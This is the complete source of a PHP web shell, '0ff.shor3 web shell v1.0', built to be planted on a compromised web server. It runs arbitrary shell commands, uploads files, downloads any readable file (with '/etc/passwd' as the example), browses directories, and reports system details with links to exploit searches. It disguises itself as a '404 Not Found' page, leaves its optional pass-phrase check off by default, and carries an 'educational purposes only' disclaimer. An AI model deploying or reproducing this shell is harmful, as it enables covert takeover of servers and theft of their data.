<?
$use_auth = FALSE; // TODO: switch to TRUE before use

$pwd = "LET_ME_IN"; // TODO: change pass-phrase before use

error_reporting(0);

set_time_limit(0);

$shell = $_SERVER["PHP_SELF"];

header("Expires: Sun, 01 Jan 2000 00:00:00 GMT");
header("Cache-Control: no-store, no-cache, must-revalidate");
header("Cache-Control: post-check=0, pre-check=0", FALSE);
header("Pragma: no-cache");

if ($use_auth)
{
	if ($_SERVER["HTTP_USER_AGENT"] != md5($pwd)) 
	{
		exit( sprintf("
			<h1>404 Not Found</h1>
			<p>The requested URL %s was not found on this server.</p>
			<hr>
			<p><i>%s Server: <b>%s</b> Port: <b>%s</b></i></p>
			",
			$_SERVER["REQUEST_URI"],
			$_SERVER["SERVER_SOFTWARE"],
			$_SERVER["SERVER_ADDR"],
			$_SERVER["SERVER_PORT"]
			)
		);
	}
}

function format_size($b)
{
	if ($b >= 1024 * 1024 * 1024) { return number_format((float) $b / (1024 * 1024 * 1024), 2, '.', '') . " GB"; }
	if ($b >= 1024 * 1024) { return number_format((float) $b / (1024 * 1024), 2, '.', '') . " MB"; }
	if ($b >= 1024) { return number_format((float) $b / (1024), 2, '.', '') . " KB"; }
	return strval($b) . " B";
}

function show_alert($msg)
{
	echo( sprintf("<script>alert('%s');</script>", $msg) );
}

$cwd = posix_getcwd();
$free_disk_space = disk_free_space("/");
$total_disk_space = disk_total_space("/");
$disable_functions = ini_get("disable_functions");

if (isset($_GET["php_info"]))
{
	phpinfo(); exit();
}

if (isset($_POST["mk_file"]))
{
	if (is_writable($cwd))
	{
		if (!file_exists($cwd . "/" . $_POST["mk_file"]))
		{
			$result_mk_f = (touch($_POST["mk_file"])) ? "[+] success: file created" : "[-] error: file not created";
		}
		else
		{
			$result_mk_f = "[-] error: file already exists";
		}
	}
	else
	{
		$result_mk_f = "[-] error: folder not writable";
	}
}

if (isset($_POST["mk_dir"]))
{
	if (is_writable($cwd))
	{
		if (!file_exists($cwd . "/" . $_POST["mk_dir"]))
		{
			$result_mk_f = (mkdir($_POST["mk_dir"])) ? "[+] success: directory created" : "[-] error: directory not created";
		}
		else
		{
			$result_mk_f = "[-] error: directory already exists";
		}
	}
	else
	{
		$result_mk_f = "[-] error: folder not writable";
	}
}

if (isset($_FILES["upload"]))
{
	$target_directory = $cwd;
	$target_file = $target_directory . "/" . basename($_FILES["upload"]["name"]);
	$result_u = null;

	if (file_exists($target_file))
	{
		$result_u = "[-] error: file already exists"; 
	}
	else
	{
		if (move_uploaded_file($_FILES["upload"]["tmp_name"], $target_file))
		{
			$result_u = "[+] success: file uploaded";
		}
		else
		{
			$result_u = "[-] error: file not uploaded";
		}
	}
}

if (isset($_POST["download"]))
{
	$target_directory = $cwd;
	$target_file = $target_directory . "/" . $_POST["download"];
	$result_d = null;

	if (file_exists($target_file))
	{
		if (is_readable($target_file))
		{
			header("Content-Length:" . filesize($target_file) . "");
			header("Content-Description: File Transfer");
			header("Content-Type: application/octet-stream");
			header('Content-Disposition: attachment; filename="' . $target_file . '"');
		
			flush();

			readfile($target_file);

			exit();
		}
		else
		{
			$result_d = "[-] error: can't read file";
		}
		
	}
}

if (isset($_POST["exec"]))
{
	$command = $_POST["exec"];

	$output = null;
	$result = null;
	$result_code = null;

	try {
		$result = exec($command, $output, $result_code);
	} catch (Error $e) {
		$result = $e;
	}
}

if (isset($_POST["dir"]))
{
	$dir = $_POST["dir"];

	if (is_dir($dir)) { chdir($dir); }
}

if (isset($_POST["kill"]))
{
	if (unlink(__FILE__))
	{
		show_alert("[+] success: shell deleted"); exit();
	}
	else
	{
		show_alert("[-] error: shell not deleted");
	}
}

echo( sprintf("
<!DOCTYPE html>

<html>

<head>
	<title>404 Not Found</title>

	<meta charset='utf-8' /> 
	<meta http-equiv='expires' content='Sun, 01 Jan 2000 00:00:00 GMT' />
	<meta http-equiv='pragma' content='no-cache' />

	<style>
	body {
		color: #c8c8c8; background-color: #323232;
	}
	a {
		color: #7b7b7b;
	}
	table {
		border-collapse: collapse;
	}
	td {
		padding: 4px;
	}
	th {
		text-align: left;
	}
	tr > td:nth-child(1) {
		color: #bcd05d;
	}
	tr:nth-child(odd) {
		background-color: #323232;
	}
	tr:nth-child(even) {
		background-color: #3c3c3c;
	}
	form {
		display: flex; align-items: center; gap: 8px; margin: 16px 0px;
	}
	</style>
</head>

<body>

<pre name='banner'>
 ▒█████    █████▒ █████▒       ██████  ██░ ██  ▒█████   ██▀███  ▓█████     █     █░▓█████  ▄▄▄▄        ██████  ██░ ██ ▓█████  ██▓     ██▓    
▒██▒  ██▒▓██   ▒▓██   ▒      ▒██    ▒ ▓██░ ██▒▒██▒  ██▒▓██ ▒ ██▒▓█   ▀    ▓█░ █ ░█░▓█   ▀ ▓█████▄    ▒██    ▒ ▓██░ ██▒▓█   ▀ ▓██▒    ▓██▒    
▒██░  ██▒▒████ ░▒████ ░      ░ ▓██▄   ▒██▀▀██░▒██░  ██▒▓██ ░▄█ ▒▒███      ▒█░ █ ░█ ▒███   ▒██▒ ▄██   ░ ▓██▄   ▒██▀▀██░▒███   ▒██░    ▒██░    
▒██   ██░░▓█▒  ░░▓█▒  ░        ▒   ██▒░▓█ ░██ ▒██   ██░▒██▀▀█▄  ▒▓█  ▄    ░█░ █ ░█ ▒▓█  ▄ ▒██░█▀       ▒   ██▒░▓█ ░██ ▒▓█  ▄ ▒██░    ▒██░    
░ ████▓▒░░▒█░   ░▒█░     ██▓ ▒██████▒▒░▓█▒░██▓░ ████▓▒░░██▓ ▒██▒░▒████▒   ░░██▒██▓ ░▒████▒░▓█  ▀█▓   ▒██████▒▒░▓█▒░██▓░▒████▒░██████▒░██████▒
░ ▒░▒░▒░  ▒ ░    ▒ ░     ▒▓▒ ▒ ▒▓▒ ▒ ░ ▒ ░░▒░▒░ ▒░▒░▒░ ░ ▒▓ ░▒▓░░░ ▒░ ░   ░ ▓░▒ ▒  ░░ ▒░ ░░▒▓███▀▒   ▒ ▒▓▒ ▒ ░ ▒ ░░▒░▒░░ ▒░ ░░ ▒░▓  ░░ ▒░▓  ░
  ░ ▒ ▒░  ░      ░       ░▒  ░ ░▒  ░ ░ ▒ ░▒░ ░  ░ ▒ ▒░   ░▒ ░ ▒░ ░ ░  ░     ▒ ░ ░   ░ ░  ░▒░▒   ░    ░ ░▒  ░ ░ ▒ ░▒░ ░ ░ ░  ░░ ░ ▒  ░░ ░ ▒  ░
░ ░ ░ ▒   ░ ░    ░ ░     ░   ░  ░  ░   ░  ░░ ░░ ░ ░ ▒    ░░   ░    ░        ░   ░     ░    ░    ░    ░  ░  ░   ░  ░░ ░   ░     ░ ░     ░ ░   
    ░ ░                   ░        ░   ░  ░  ░    ░ ░     ░        ░  ░       ░       ░  ░ ░               ░   ░  ░  ░   ░  ░    ░  ░    ░  ░

0ff.shor3 web shell v1.0 | dev: @sug4r-wr41th | Fair Use disclaimer: for educational purposes only.
</pre>

	<script>
	window.onload = function()
	{
		const list = document.getElementsByTagName('b');

		for (const e of list)
		{
			if (e.textContent == 'ON') { e.style.color = 'green'; } 
			if (e.textContent == 'OFF') { e.style.color = 'red'; } 
		}
	}
	</script>

	<table>
		<tr><td>Your IP</td><td>%s</td></tr>
		<tr><td>Status</td><td>Connected! @ %s : %s</td></tr>
		<tr><td>Date Time</td><td>%s</td></tr>
		<tr><td>User</td><td>%s</td></tr>
		<tr><td>Group</td><td>%s</td></tr>
		<tr><td>System</td><td>%s</td></tr>
		<tr><td>PHP Info</td><td>%s | Safe Mode: <b>%s</b> Magic Quotes: <b>%s</b> | Error Reporting Level: <b>%s</b> | Disable Functions: <b>%s</b> %s</td></tr>
		<tr><td>PHP Extensions</td><td>cURL: <b>%s</b> rar: <b>%s</b> zip: <b>%s</b> | MySQL/MariaDB: <b>%s</b> MongoDB: <b>%s</b> PostgreSQL: <b>%s</b> Oracle: <b>%s</b> | SSH2: <b>%s</b> FTP: <b>%s</b></td></tr>
		<tr><td>Current Directory</td><td>%s</td></tr>
		<tr><td>Free / Total disk space</td><td>%s / %s (%s)</td></tr>
	</table>
	",
	$_SERVER["REMOTE_ADDR"],
	$_SERVER["SERVER_ADDR"],
	$_SERVER["SERVER_PORT"],
	date("Y-m-d H:i:s"),
	sprintf("%s ( %s )", posix_getuid(), posix_getpwuid(posix_getuid())["name"]),
	sprintf("%s ( %s )", posix_getgid(), posix_getgrgid(posix_getgid())["name"]),
	implode(" ", posix_uname()),
	PHP_VERSION . " <a href='https://duckduckgo.com/?q=php+vulnerabilities' target='_blank'>[ DuckDuckGo ]</a> <a href='https://www.exploit-db.com/search?q=PHP' target='_blank'>[ exploit-db ]</a>",
	((int) ini_get("safe_mode")) ? "ON": "OFF",
	(function_exists("get_magic_quotes_runtime") AND get_magic_quotes_runtime()) ? "ON" : "OFF",
	error_reporting(),
	$disable_functions == "" ? "all functions available" : $disable_functions,
	"<a href=" . $shell . '/?php_info' . ">[ phpinfo ]</a>",
	extension_loaded("curl") ? "ON" : "OFF",
	extension_loaded("rar") ? "ON" : "OFF",
	extension_loaded("zip") ? "ON" : "OFF",

	extension_loaded("mysqli") ? "ON" : "OFF",
	extension_loaded("mongodb") ? "ON" : "OFF",
	extension_loaded("pgsql") ? "ON" : "OFF",
	extension_loaded("oci8") ? "ON" : "OFF",

	extension_loaded("ssh2") ? "ON" : "OFF",
	extension_loaded("ftp") ? "ON" : "OFF",
	$cwd,
	format_size($free_disk_space),
	format_size($total_disk_space),
	number_format(($free_disk_space / $total_disk_space) * 100, 2, ".", "") . "%"
	)
);
?>

<form action="<? echo($shell); ?>" method="POST">
	<label for="exec">Command:</label>
	<input type="text" id="exec" name="exec" placeholder="ls -ls">
	<input type="submit" value="Execute">
	<?php
	$functions = explode(",", $disable_functions);

	foreach ($functions as &$f)
	{
		if ($f == "exec") { echo( "<b>Warning:</b> exec function is disabled, so the 'Execute' feature do not work." ); break; }
	}
	?>
</form>

<?php
if (isset($result))
{
	if (is_object($result)) { show_alert("[-] error: command contains null bytes"); }
	if (is_bool($result)) { show_alert("[-] error: command not found"); }

	if (is_string($result)) { echo( sprintf("<textarea rows='4' cols='64'>%s</textarea>", implode("\n", $output)) ); }
}
?>

<form action="<? echo($shell); ?>" method="POST">
	<input type="hidden" id="kill" name="kill">
	<input type="submit" value="Self Remove">
	<b>Warning!</b> You'll forever lose access to the shell. This action can't be undone.
</form>

<h1>File Manager</h1>

<?php
if ($cwd)
{
	$files = scandir($cwd);

	?>
	<table>
		<tr>
			<th width="32"></th>
			<th>Name</th>
			<th>Size</th>
			<th>Creation Date</th>
			<th>Last Modified</th>
			<th>Owner / Group</th>
			<th>Permissions</th>
		</tr>
		<?php
		foreach ($files as &$f)
		{
			$perms = fileperms($f);

			switch ($perms & 0xF000) {
					case 0xC000:
							$info = 's';
							break;
					case 0xA000:
							$info = 'l';
							break;
					case 0x8000:
							$info = 'r';
							break;
					case 0x6000:
							$info = 'b';
							break;
					case 0x4000:
							$info = 'd';
							break;
					case 0x2000:
							$info = 'c';
							break;
					case 0x1000:
							$info = 'p';
							break;
					default:
							$info = 'u';
			}

			$info .= " | ";
			$info .= (($perms & 0x0100) ? 'r' : '-');
			$info .= (($perms & 0x0080) ? 'w' : '-');
			$info .= (($perms & 0x0040) ?
									(($perms & 0x0800) ? 's' : 'x' ) :
									(($perms & 0x0800) ? 'S' : '-'));

			$info .= (($perms & 0x0020) ? 'r' : '-');
			$info .= (($perms & 0x0010) ? 'w' : '-');
			$info .= (($perms & 0x0008) ?
									(($perms & 0x0400) ? 's' : 'x' ) :
									(($perms & 0x0400) ? 'S' : '-'));

			$info .= (($perms & 0x0004) ? 'r' : '-');
			$info .= (($perms & 0x0002) ? 'w' : '-');
			$info .= (($perms & 0x0001) ?
									(($perms & 0x0200) ? 't' : 'x' ) :
									(($perms & 0x0200) ? 'T' : '-'));

			$icon = null;

			if ($f == "." OR
					$f == "..")
			{
				$icon = "<svg viewBox='0 0 24 24' fill='none' xmlns='http://www.w3.org/2000/svg'><g stroke-width='0'></g><g stroke-linecap='round' stroke-linejoin='round'></g><g > <path fill-rule='evenodd' clip-rule='evenodd' d='M6.46967 10.0303C6.17678 9.73744 6.17678 9.26256 6.46967 8.96967L11.4697 3.96967C11.7626 3.67678 12.2374 3.67678 12.5303 3.96967L17.5303 8.96967C17.8232 9.26256 17.8232 9.73744 17.5303 10.0303C17.2374 10.3232 16.7626 10.3232 16.4697 10.0303L12 5.56066L7.53033 10.0303C7.23744 10.3232 6.76256 10.3232 6.46967 10.0303Z' fill='#d8d8d8'></path> <g opacity='0.5'> <path d='M11.25 14.5C11.25 15.4534 11.5298 16.8667 12.3913 18.0632C13.2804 19.298 14.7556 20.25 17 20.25C17.4142 20.25 17.75 19.9142 17.75 19.5C17.75 19.0858 17.4142 18.75 17 18.75C15.2444 18.75 14.2196 18.0353 13.6087 17.1868C12.9702 16.3 12.75 15.2133 12.75 14.5L12.75 6.31066L12 5.56066L11.25 6.31066V14.5Z' fill='#d8d8d8'></path> <path d='M11.8023 3.77639C11.9568 3.73435 12.122 3.74254 12.2722 3.80095C12.1879 3.76805 12.096 3.75 12 3.75C11.9316 3.75 11.8653 3.75919 11.8023 3.77639Z' fill='#d8d8d8'></path> </g> </g></svg>";
			}
			else if (is_dir($f))
			{
				$icon = "<svg viewBox='0 0 24 24' fill='none' xmlns='http://www.w3.org/2000/svg'><g stroke-width='0'></g><g stroke-linecap='round' stroke-linejoin='round'></g><g > <path opacity='0.5' d='M2 6.94975C2 6.06722 2 5.62595 2.06935 5.25839C2.37464 3.64031 3.64031 2.37464 5.25839 2.06935C5.62595 2 6.06722 2 6.94975 2C7.33642 2 7.52976 2 7.71557 2.01738C8.51665 2.09229 9.27652 2.40704 9.89594 2.92051C10.0396 3.03961 10.1763 3.17633 10.4497 3.44975L11 4C11.8158 4.81578 12.2237 5.22367 12.7121 5.49543C12.9804 5.64471 13.2651 5.7626 13.5604 5.84678C14.0979 6 14.6747 6 15.8284 6H16.2021C18.8345 6 20.1506 6 21.0062 6.76946C21.0849 6.84024 21.1598 6.91514 21.2305 6.99383C22 7.84935 22 9.16554 22 11.7979V14C22 17.7712 22 19.6569 20.8284 20.8284C19.6569 22 17.7712 22 14 22H10C6.22876 22 4.34315 22 3.17157 20.8284C2 19.6569 2 17.7712 2 14V6.94975Z' fill='#d8d8d8'></path> <path d='M20 6.23751C19.9992 5.94016 19.9949 5.76263 19.9746 5.60842C19.7974 4.26222 18.7381 3.2029 17.3919 3.02567C17.1969 3 16.9647 3 16.5003 3H9.98828C10.1042 3.10392 10.2347 3.23445 10.45 3.44975L11.0003 4C11.8161 4.81578 12.2239 5.22367 12.7124 5.49543C12.9807 5.64471 13.2653 5.7626 13.5606 5.84678C14.0982 6 14.675 6 15.8287 6H16.2024C17.9814 6 19.1593 6 20 6.23751Z' fill='#d8d8d8'></path> <path fill-rule='evenodd' clip-rule='evenodd' d='M12.25 10C12.25 9.58579 12.5858 9.25 13 9.25H18C18.4142 9.25 18.75 9.58579 18.75 10C18.75 10.4142 18.4142 10.75 18 10.75H13C12.5858 10.75 12.25 10.4142 12.25 10Z' fill='#d8d8d8'></path> </g></svg>";
			}
			else if (is_file($f))
			{
				$icon = "<svg viewBox='0 0 24 24' fill='none' xmlns='http://www.w3.org/2000/svg'><g stroke-width='0'></g><g stroke-linecap='round' stroke-linejoin='round'></g><g > <g opacity='0.5'> <path fill-rule='evenodd' clip-rule='evenodd' d='M14 22H10C6.22876 22 4.34315 22 3.17157 20.8284C2 19.6569 2 17.7712 2 14V10C2 6.22876 2 4.34315 3.17157 3.17157C4.34315 2 6.23869 2 10.0298 2C10.6358 2 11.1214 2 11.53 2.01666C11.5166 2.09659 11.5095 2.17813 11.5092 2.26057L11.5 5.09497C11.4999 6.19207 11.4998 7.16164 11.6049 7.94316C11.7188 8.79028 11.9803 9.63726 12.6716 10.3285C13.3628 11.0198 14.2098 11.2813 15.0569 11.3952C15.8385 11.5003 16.808 11.5002 17.9051 11.5001L18 11.5001H21.9574C22 12.0344 22 12.6901 22 13.5629V14C22 17.7712 22 19.6569 20.8284 20.8284C19.6569 22 17.7712 22 14 22Z' fill='#d8d8d8'></path> </g> <path d='M6 13.75C5.58579 13.75 5.25 14.0858 5.25 14.5C5.25 14.9142 5.58579 15.25 6 15.25H14C14.4142 15.25 14.75 14.9142 14.75 14.5C14.75 14.0858 14.4142 13.75 14 13.75H6Z' fill='#d8d8d8'></path> <path d='M6 17.25C5.58579 17.25 5.25 17.5858 5.25 18C5.25 18.4142 5.58579 18.75 6 18.75H11.5C11.9142 18.75 12.25 18.4142 12.25 18C12.25 17.5858 11.9142 17.25 11.5 17.25H6Z' fill='#d8d8d8'></path> <path d='M11.5092 2.2601L11.5 5.0945C11.4999 6.1916 11.4998 7.16117 11.6049 7.94269C11.7188 8.78981 11.9803 9.6368 12.6716 10.3281C13.3629 11.0193 14.2098 11.2808 15.057 11.3947C15.8385 11.4998 16.808 11.4997 17.9051 11.4996L21.9574 11.4996C21.9698 11.6552 21.9786 11.821 21.9848 11.9995H22C22 11.732 22 11.5983 21.9901 11.4408C21.9335 10.5463 21.5617 9.52125 21.0315 8.79853C20.9382 8.6713 20.8743 8.59493 20.7467 8.44218C19.9542 7.49359 18.911 6.31193 18 5.49953C17.1892 4.77645 16.0787 3.98536 15.1101 3.3385C14.2781 2.78275 13.862 2.50487 13.2915 2.29834C13.1403 2.24359 12.9408 2.18311 12.7846 2.14466C12.4006 2.05013 12.0268 2.01725 11.5 2.00586L11.5092 2.2601Z' fill='#d8d8d8'></path> </g></svg>";
			}

			echo( sprintf("<tr><td>%s</td><td>%s</td><td>%s</td><td>%s</td><td>%s</td><td>%s / %s</td><td>%s</td></tr>",
				$icon, 
				$f,
				is_file($f) ? format_size(filesize($f)) : "dir", 
				date(DATE_RFC2822, filectime($f)),
				date(DATE_RFC2822, filemtime($f)),
				sprintf("%s ( %s )", posix_getuid(), posix_getpwuid(fileowner($f))["name"]),
				sprintf("%s ( %s )", posix_getgid(), posix_getgrgid(filegroup($f))["name"]),
				$info
				) 
			);
		}
		?>
	</table>
	<?php
}
?>

<form action="<? echo($shell); ?>" method="POST">
	<input type="text" id="mk_file" name="mk_file" placeholder="file.tmp" required>
	<input type="submit" value="Make File" <?php if (!is_writable($cwd)) { echo("disabled"); } ?> >
	[ cwd <?php echo(is_writable($cwd) ? "is" : "is not"); ?> writable ]
</form>

<?php if (isset($result_mk_f)) { show_alert($result_mk_f); } ?>

<form action="<? echo($shell); ?>" method="POST">
	<input type="text" id="mk_dir" name="mk_dir" placeholder="var" required>
	<input type="submit" value="Make Directory" <?php if (!is_writable($cwd)) { echo("disabled"); } ?>>
	[ cwd <?php echo(is_writable($cwd) ? "is" : "is not"); ?> writable ]
</form>

<?php if (isset($result_mk_d)) { show_alert($result_mk_d); } ?>

<form action="<? echo($shell); ?>" method="POST" enctype="multipart/form-data">
	<label for="upload">File:</label>
	<input type="file" id="upload" name="upload">
	<input type="submit" value="Upload" <?php if (!is_writable($cwd)) { echo("disabled"); } ?>>
	[ cwd <?php echo(is_writable($cwd) ? "is" : "is not"); ?> writable ]
</form>

<?php if (isset($result_u)) { show_alert($result_u); } ?>

<form action="<? echo($shell); ?>" method="POST">
	<label for="download">File:</label>
	<input type="text" id="download" name="download" placeholder="/etc/passwd">
	<input type="submit" value="Download" <?php if (!is_readable($cwd)) { echo("disabled"); } ?>>
	[ cwd <?php echo(is_readable($cwd) ? "is" : "is not"); ?> readable ]
</form>

<?php if (isset($result_d)) { show_alert($result_d); } ?>

<form action="<? echo($shell); ?>" method="POST">
	<label for="dir">Folder:</label>
	<input type="text" id="dir" name="dir" value="<?php echo($cwd); ?>" size="32">
	<input type="submit" value="Change Directory">
</form>

</body></html>